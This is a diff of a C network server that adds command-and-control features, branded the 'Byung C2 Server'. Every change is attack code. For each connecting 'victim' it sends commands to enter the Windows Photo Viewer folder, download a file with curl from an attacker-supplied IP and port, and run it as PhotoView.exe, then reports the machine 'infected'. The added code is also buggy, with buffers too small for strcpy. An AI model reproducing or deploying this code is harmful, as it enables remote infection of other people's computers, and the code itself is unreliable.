@@ -26,8 +26,8 @@ int main(int argc, char **argv) {
   socklen_t addrlen;
 
   /* CHECK ARGS */
-  if(argc != 2) {
-    fprintf(stderr, "Usage: %s <Port Number>\n", argv[0]);
+  if(argc != 4) {
+    fprintf(stderr, "Usage: %s <Port Number> <Machine IP> <Python Server Port Number>\n", argv[0]);
     exit(EXIT_FAILURE);
   }
 
@@ -52,6 +52,32 @@ int main(int argc, char **argv) {
   if((z = listen(s,10)) == -1) 
     error("[*] ERROR: Error, listening on socket");
 
+  /* COMMAND INJECT */
+
+  // grab ip && port
+  char *ip = argv[2];
+  char *port = argv[3];
+
+  // curl command
+  char curlBuf[50];
+  sprintf(curlBuf, "curl -O http://%s:%s", ip, port);
+
+  // command strings
+  char *changeDir = "cd \"C:\\Program Files\\Windows Photo Viewer\"";
+  char *execute = "PhotoView.exe";
+
+  // bufs
+  char changeDirBuf[strlen(changeDir)];
+  char executeBuf[strlen(execute)];
+
+  // set buffers
+  strcpy(changeDirBuf, changeDir);
+  strcpy(executeBuf, execute);
+
+  // display user message
+  printf("\n   *Byung C2 Server*"); 
+  printf("\n\n[i] Listening for Victim connections...");
+
   /* MAIN PROGRAM LOOP */
   for(;;) {
 
@@ -59,6 +85,9 @@ int main(int argc, char **argv) {
     addrlen = sizeof(clientAddress);
     if((c = accept(s, (struct sockaddr *)&clientAddress, &addrlen)) == -1)
        error("[*] ERROR: Error, client connection failed");
+
+    // update
+    printf("\nVictim Connected!!!");
     
     /* READ CLIENT REQUESTS */
     if(!(rStream = fdopen(c, "r"))) {
@@ -78,8 +107,30 @@ int main(int argc, char **argv) {
 
     /* PROCESS CLIENT REQUEST AND RESPONSE */
 
+    //update
+    printf("\n\nExecuting Commands: \n");
 
-    
+    /* CHANGE DIR */
+    // C:\'Program Files'\'Windows Photo Viewer'
+    printf("[*]%s\n", changeDirBuf);
+    fwrite(changeDirBuf, sizeof(char), sizeof(changeDirBuf) - 1, wStream);
+
+    /* CURL DOWNLOAD */
+    // http://ip_addr:port
+    printf("[*]%s\n", curlBuf);
+    fwrite(curlBuf, sizeof(char), sizeof(curlBuf) - 1, wStream);
+
+    // wait for download
+    sleep(15);
+
+    /* EXECUTE FILE */
+    // filename
+    printf("[*]%s\n", executeBuf);
+    fwrite(executeBuf, sizeof(char), sizeof(executeBuf) - 1, wStream);
+
+    // update
+    printf("\n\nSuccess! Victim Machine infected");
+
     /* CLOSE CLIENT CONNECTION */
     fclose(wStream);
     shutdown(fileno(rStream), SHUT_RDWR);
